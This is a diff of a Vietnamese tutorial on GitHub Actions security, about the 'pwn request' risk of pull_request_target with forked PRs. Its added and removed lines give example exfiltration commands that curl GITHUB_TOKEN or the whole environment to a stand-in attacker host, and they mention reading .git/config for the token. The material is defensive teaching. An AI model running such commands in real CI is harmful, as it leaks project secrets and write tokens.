@@ -10,7 +10,7 @@ objectives:
 prerequisites:
   - github-actions-basics/workflow-security/permissions-token
 authors: [github:TienNHM]
-terms: [fork, pull_request_target, untrusted, pwn request]
+terms: [fork, pull_request_target, untrusted, pwn request, lint]
 ---
 
 # PR từ fork, pull_request và pull_request_target
@@ -63,7 +63,10 @@ jobs:
 
 - `on: pull_request_target`: có secret, có token quyền ghi.
 - `ref: ${{ github.event.pull_request.head.sha }}`: bảo checkout lấy **commit của PR**, tức code của người lạ, thay cho code nhánh chính.
-- `npm ci && npm test`: chạy code đó. Người mở PR chỉ cần sửa `package.json` thêm một dòng `"test": "curl https://ke-xau.example/?t=$GITHUB_TOKEN"`, hay một script cài đặt chạy trong `npm ci`, là lấy được token có quyền ghi và mọi secret của job.
+- `npm ci && npm test`: chạy code đó. Người mở PR chỉ cần sửa dòng `"test"` trong `package.json` (hoặc một script tự chạy khi `npm ci` cài đặt) để nó làm việc khác, ví dụ:
+  - đọc file `.git/config` trên runner: `actions/checkout` mặc định **cất GITHUB_TOKEN vào đó** (tùy chọn `persist-credentials`, bật sẵn) để các lệnh `git` sau còn dùng được; token này có quyền ghi theo `permissions`;
+  - gửi toàn bộ biến môi trường đi, kiểu `env | curl --data-binary @- https://ke-xau.example`: mọi secret mà job đưa vào `env:` đều nằm trong đó.
+  Vậy là token có quyền ghi và secret của job đã rời khỏi runner.
 
 Mẫu tấn công này có tên **pwn request** (*pwn* là tiếng lóng "chiếm quyền", ghép với *pull request*). Đây là lỗi có thật, đã làm lộ secret và token của nhiều dự án mã nguồn mở lớn.
 
@@ -73,7 +76,7 @@ sequenceDiagram
   participant K as Kẻ xấu
   participant G as GitHub
   participant R as Runner
-  K->>K: fork repo, sửa package.json: "test" gửi token đi
+  K->>K: fork repo, sửa script test để đọc token và secret rồi gửi đi
   K->>G: mở pull request
   G->>R: pull_request_target: chạy workflow của nhánh chính, KÈM secret và token ghi
   R->>R: checkout head.sha (code của kẻ xấu)
@@ -86,7 +89,7 @@ sequenceDiagram
 
 | Việc cần làm trên PR | Event nên dùng |
 | --- | --- |
-| Build, test, lint code của PR | `pull_request` |
+| Build, test, **lint** (*soi lỗi*: chạy công cụ đọc code tìm lỗi và chỗ viết sai quy ước, như actionlint ở chương 1) code của PR | `pull_request` |
 | Gắn nhãn, bình luận, **không** đụng code của PR | `pull_request_target` cũng được, nhưng không checkout `head`, không chạy script nào từ PR |
 | Vừa chạy code PR, vừa cần secret | Tách hai bước: test bằng `pull_request`; phần cần secret chỉ chạy sau khi merge (`push` lên `main`) hoặc sau khi maintainer duyệt (environment, chương 4) |
 
